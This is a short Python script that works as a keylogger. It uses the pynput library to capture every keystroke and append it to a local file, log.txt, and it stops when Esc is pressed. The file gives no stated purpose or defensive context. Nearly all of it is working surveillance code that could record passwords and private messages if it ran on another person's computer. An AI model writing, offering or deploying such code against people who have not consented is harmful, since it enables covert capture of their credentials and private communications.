import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def keyPress(key):
	global keys, count
	keys.append(key)
	count += 1
	#print("{0} Pressed".format(key))
	if count >= 1:
		count = 0;
		writeToFile(keys)
		keys = []


def writeToFile(keys):
	with open("log.txt", "a") as f:
		for key in keys:
			k = str(key).replace("'", "")
			if k.find("space") > 0:
				f.write(" ")
			elif k.find("enter") > 0:
				f.write("\n")
			elif k.find("Key") == -1:
				f.write(k)


def keyRelease(key):
	if key == Key.esc:
		return False


with Listener(on_press=keyPress, on_release=keyRelease) as listener:
	listener.join()